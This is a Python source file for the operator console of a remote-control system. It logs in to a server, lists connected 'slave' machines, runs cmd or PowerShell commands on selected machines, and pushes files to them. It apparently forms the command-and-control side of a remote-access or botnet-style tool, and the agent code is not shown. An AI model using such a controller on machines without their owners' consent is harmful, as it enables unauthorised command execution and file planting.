from src.client import Client
import os
import sys
from rich.console import Console

ARROW = '[#fc7a23]->[/] '

class MasterClient(Client):
    def __init__(self, addr: tuple, debug: bool = False) -> None:
        super().__init__(addr, debug)

        self.commands = Commands(self)
        self.console = Console()

        self.available_slaves = []
        self.selected_slaves = []

    def get_password(self, registering: bool=False) -> str:
        if registering:
            while True:
                self.console.print(f"Register")
                passwd1 = self.console.input(f"{ARROW}Enter a password: ", password=True)
                passwd2 = self.console.input(f"{ARROW}Confirm password: ", password=True)
                if passwd1 == passwd2:
                    return passwd1
                else:
                    self.console.print(f"{ARROW}Passwords don't match. Try again.")
        else:
            self.console.print(f"Log in")
            return self.console.input(f"{ARROW}Enter a password: ", password=True)

    def handle_connection(self) -> bool:
        self.send_bytes(b'Master')
        if self.recv_bytes() == b'OK':
            msg = self.recv_bytes()
            if msg == b'REGISTER':
                byte_passwd = self.get_password(True).encode('utf-8')
                self.send_bytes(byte_passwd)
                if self.recv_bytes() == b'OK':
                    self.console.print(f"{ARROW}[bold green]Password registered successfully[/]")
                    return True
                else:
                    self.console.print(f"{ARROW}[bold red]Password registration failed[/]")
                    return False
            elif msg == b'LOGIN':
                byte_passwd = self.get_password().encode('utf-8')
                self.send_bytes(byte_passwd)
                if self.recv_bytes() == b'OK':
                    self.console.print(f"{ARROW}[bold green]Password accepted[/]")
                    return True
                else:
                    self.console.print(f"{ARROW}[bold red]Password rejected[/]")
                    return False
        return False

    def show_prompt(self) -> str:
        if len(self.selected_slaves) > 0:
            selected = ""
            for i, slave in enumerate(self.selected_slaves):
                if i == 0:
                    selected += f"[#fc7a23]┌([#8cfa16]{slave['username']}[#ffffff]@[#16faef]{slave['hostname']}[#fc7a23])[/]\n"
                else:
                    selected += f"[#fc7a23]├([#8cfa16]{slave['username']}[#ffffff]@[#16faef]{slave['hostname']}[#fc7a23])[/]\n"
            self.console.print(selected, end="")
            command = self.console.input("[#fc7a23]└ [#fc7a23]$[/] ",)
        else:
            command = self.console.input("[#fc7a23]$[/] ",)
        return command

    def show_response_sender(self, slave):
        self.console.print(f"[#fc7a23]┌([#8cfa16]{slave['username']}[#ffffff]@[#16faef]{slave['hostname']}[#fc7a23])[/]")
        self.console.print('[#fc7a23]└>[/] ',end='')

    def slave_by_addr(self, addr):
        for slave in self.available_slaves:
            if slave['addr'] == addr:
                return slave
        return None

    def pop_slave(self, addr):
        slaves = []
        removed = None
        for slave in self.selected_slaves:
            if slave['addr'] != addr:
                slaves.append(slave)
            else:
                removed = slave
        self.selected_slaves = slaves
        return removed

    def execute(self, command):
        first_arg = command.split(' ')[0]
        try:
            if first_arg in ['master', 'console']:
                raise AttributeError
            func = getattr(self.commands, first_arg)
        except AttributeError:
            self.console.print(f"{ARROW}Unknown command!")
            self.console.print(f"{ARROW}Type 'help' for a list of available commands.")
        else:
            func(command)

    def command_loop(self):
        while True:
            if not self.connected:
                self.connect()
                continue

            command = self.show_prompt()
            if not command: continue
            self.execute(command)


class Commands:

    def __init__(self, master):
        self.master = master
        self.console = Console()

    def list(self, command):
        msg = {
            'type': 'slave_command',
            'recipients': 'all',
            'command': 'pc_info',
            }
        self.master.send_dict(msg)
        msg = self.master.recieve_dict()
        if not msg: self.console.print(f"{ARROW}[bold red]No response from server![/]")

        index_len = 5
        username_len = 10
        hostname_len = 19
        os_version_len = 14
        addr_len = 22

        self.console.print(f"+{'-'*index_len}+{'-'*username_len}+{'-'*hostname_len}+{'-'*os_version_len}+{'-'*addr_len}+")
        self.console.print(f"|{'INDEX'.center(index_len)}|{'USERNAME'.center(username_len)}|{'HOSTNAME'.center(hostname_len)}|{'OS VER'.center(os_version_len)}|{'ADDRESS'.center(addr_len)}|")
        self.console.print(f"+{'-'*index_len}+{'-'*username_len}+{'-'*hostname_len}+{'-'*os_version_len}+{'-'*addr_len}+")
        slaves = []
        for response in msg['responses']:
            if response['response']:
                data = response['response']
                data.update({'addr': response['addr']})
                slaves.append(data)
        if not slaves:
            self.console.print(f"{ARROW}[bold red]No slaves connected![/]")
            return False
        slaves.sort(key=lambda x: x['username'])
        for i, slave in enumerate(slaves):
            slave.update({'index': i})
            address = f"{slave['addr'][0]}:{slave['addr'][1]}"
            self.console.print(f"|[bold yellow]{str(i).center(index_len)}[/]|[bold #8cfa16]{slave['username'].center(username_len)}[/]|[bold #16faef]{slave['hostname'].center(hostname_len)}[/]|[white]{slave['os_version'].center(os_version_len)}[/]|[white]{address.center(addr_len)}|[/]")
            self.console.print(f"+{'-'*index_len}+{'-'*username_len}+{'-'*hostname_len}+{'-'*os_version_len}+{'-'*addr_len}+")

        self.master.available_slaves = slaves
        return True

    def select(self, command):
        command = command.split(' ')
        if len(command) == 1:
            if not self.list('list'):
                return
            slaves = self.console.input(f"{ARROW}[bold yellow]Slaves: [/]",)
            args = slaves.split(' ')
        else:
            args = command[1:]
        if 'all' in args:
            self.master.selected_slaves = [slave for slave in self.master.available_slaves]
            return
        try:
            indexes = [int(i) for i in args]
        except ValueError:
            self.console.print(f"{ARROW}[bold red]Invalid index.[/]")
            return
        slaves = [slave for slave in self.master.available_slaves if slave['index'] in indexes]
        if not slaves:
            self.console.print(f"{ARROW}[bold red]Invalid index. No slaves selected[/]")
            return
        self.master.selected_slaves = slaves

    def selected(self, command):
        if len(self.master.selected_slaves) == 0:
            self.console.print(f"{ARROW}[bold red]No slaves selected![/]")
            return
        index_len = 5
        username_len = 10
        hostname_len = 19
        os_version_len = 14
        addr_len = 22
        self.console.print(f"+{'-'*index_len}+{'-'*username_len}+{'-'*hostname_len}+{'-'*os_version_len}+{'-'*addr_len}+")
        self.console.print(f"|{'INDEX'.center(index_len)}|{'USERNAME'.center(username_len)}|{'HOSTNAME'.center(hostname_len)}|{'OS VER'.center(os_version_len)}|{'ADDRESS'.center(addr_len)}|")
        self.console.print(f"+{'-'*index_len}+{'-'*username_len}+{'-'*hostname_len}+{'-'*os_version_len}+{'-'*addr_len}+")
        for slave in master.selected_slaves:
            address = f"{slave['addr'][0]}:{slave['addr'][1]}"
            self.console.print(f"|[bold yellow]{str(slave['index']).center(index_len)}[/]|[bold #8cfa16]{slave['username'].center(username_len)}[/]|[bold #16faef]{slave['hostname'].center(hostname_len)}[/]|[white]{slave['os_version'].center(os_version_len)}[/]|[white]{address.center(addr_len)}|[/]")
            self.console.print(f"+{'-'*index_len}+{'-'*username_len}+{'-'*hostname_len}+{'-'*os_version_len}+{'-'*addr_len}+")

    def clear(self, command):
        os.system('cls')

    def cmd(self, command):
        command = " ".join(command.split()[1:])
        msg = {
            'type': 'slave_command',
            'recipients': [slave['addr'] for slave in self.master.selected_slaves],
            'command': 'cmd',
            'command_string': command,
        }
        self.master.send_dict(msg)
        msg = self.master.recieve_dict()
        if not msg: self.console.print(f"{ARROW}[bold red]No response from server![/]")
        for response in msg['responses']:
            if response['response'] is None:
                slave = self.master.pop_slave(response['addr'])
                self.master.show_response_sender(slave)
                self.console.print("[bold red]Disconnected! [/]")

            for slave in self.master.selected_slaves:
                if slave['addr'] == response['addr']:
                    self.master.show_response_sender(slave)
                    output = response['response']['cmd_output'].split('\n')
                    for line in output:
                        print(f"\t{line}")
    
    def powershell(self, command):
        command = " ".join(command.split()[1:])
        msg = {
            'type': 'slave_command',
            'recipients': [slave['addr'] for slave in self.master.selected_slaves],
            'command': 'powershell',
            'command_string': command,
        }
        self.master.send_dict(msg)
        msg = self.master.recieve_dict()
        if not msg: self.console.print(f"{ARROW}[bold red]No response from server![/]")
        for response in msg['responses']:
            if response['response'] is None:
                slave = self.master.pop_slave(response['addr'])
                self.master.show_response_sender(slave)
                self.console.print("[bold red]Disconnected! [/]")

            for slave in self.master.selected_slaves:
                if slave['addr'] == response['addr']:
                    self.master.show_response_sender(slave)
                    output = response['response']['powershell_output'].split('\n')
                    for line in output:
                        print(f"\t{line}")

    def exit(self, command):
        self.master.client.sock.close()
        sys.exit()

    def sendfile(self, command):
        # command:  sendfile <file_path> -d [destination_path]
        args = command.split(' ')[1:]
        if len(args) < 1:
            self.console.print(f"{ARROW}Path to file not supplied.")
            return
        if not os.path.isfile(args[0]):
            self.console.print(f"{ARROW}[bold red]File not found.[/]")
            return
        destination_path = None
        for i, arg in enumerate(args):
            if arg == "-d":
                destination_path = args[i+1]
       
        filename = os.path.basename(args[0])

        msg = {
            'type': 'slave_command',
            'recipients': [slave['addr'] for slave in self.master.selected_slaves],
            'command': 'recieve_file',
            'destination_path': destination_path,
            'filename': filename,
            'filesize': os.path.getsize(args[0]),
        }
        
        self.master.send_dict(msg)
        
        msg = self.master.recieve_dict()
        available_slaves = []
        if not msg: self.console.print(f"{ARROW}[bold red]No response from server.[/]")
        for response in msg['responses']:
            if response['response']['status'] == 'error':
                if response['response']['error'] == 'wrong_path':
                    self.master.show_response_sender(self.master.slave_by_addr(response['addr']))
                    self.console.print("\t[bold red]Wrong destination path.[/]")
                    continue
                if response['response']['error'] == 'file_exists':
                    self.master.show_response_sender(self.master.slave_by_addr(response['addr']))
                    self.console.print("\t[bold red]File already exists.[/]")
                    continue
            else:
                available_slaves.append(response['addr'])

        with open(args[0], 'rb') as f:
            file_data = f.read()

        msg = {
            'type': 'slave_command',
            'recipients': [slave['addr'] for slave in self.master.selected_slaves],
            'command': 'recieve_file',
            'destination_path': destination_path,
            'filename': filename,
            'file_data': file_data,
        }

        self.master.send_dict(msg)
        msg = self.master.recieve_dict()
        if not msg: self.console.print("[bold red]No response from server.[/]")



if __name__ == "__main__":
    from config import Config

    master = MasterClient(addr=Config.SERVER_ADDR)

    master.command_loop()